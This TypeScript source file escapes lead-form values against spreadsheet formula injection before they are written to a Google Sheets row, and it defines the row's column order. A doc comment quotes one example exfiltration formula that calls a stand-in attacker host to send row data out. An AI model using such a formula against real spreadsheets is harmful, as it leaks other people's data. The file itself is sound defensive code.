/**
 * Turning a lead into a spreadsheet row, safely.
 *
 * No `server-only` and no imports, so the unit suite can exercise the escaping directly. Formula
 * injection is the kind of thing that is either tested or quietly broken, and a test that has to
 * stand up a Google client to check a string transformation is a test nobody runs.
 */

/**
 * Neutralises a value that a spreadsheet would treat as a formula.
 *
 * A lead is untrusted input that lands in a document the academy opens in Google Sheets, and
 * Sheets executes anything starting `=`, `+`, `-` or `@`. `=IMPORTXML("http://attacker/"&A1)`
 * in a "name" field exfiltrates the row to whoever typed it, and the academy sees a name.
 *
 * A leading apostrophe is the documented way to force a literal, and Sheets does not display it.
 * Control characters go too: a tab or a carriage return inside a value breaks the row apart.
 */
export function escapeForSheet(value: unknown): string {
  const text = value === null || value === undefined ? "" : String(value);
  const clean = text.replace(/[\t\r\n]+/g, " ").trim();
  if (clean === "") return "";
  return /^[=+\-@]/.test(clean) ? `'${clean}` : clean;
}

/** The column order the academy's sheet expects. Changing it means changing the sheet's header row. */
export function leadRow(input: {
  createdAt: string;
  type: string;
  name: string;
  phone: string;
  email: string | null;
  course: string | null;
  batch: string | null;
  message: string | null;
  page: string | null;
  referrer: string | null;
  utmSource: string | null;
  utmMedium: string | null;
  utmCampaign: string | null;
  sanityId: string | null;
}): unknown[] {
  return [
    input.createdAt,
    input.type,
    input.name,
    input.phone,
    input.email,
    input.course,
    input.batch,
    input.message,
    input.page,
    input.referrer,
    input.utmSource,
    input.utmMedium,
    input.utmCampaign,
    input.sanityId,
  ];
}
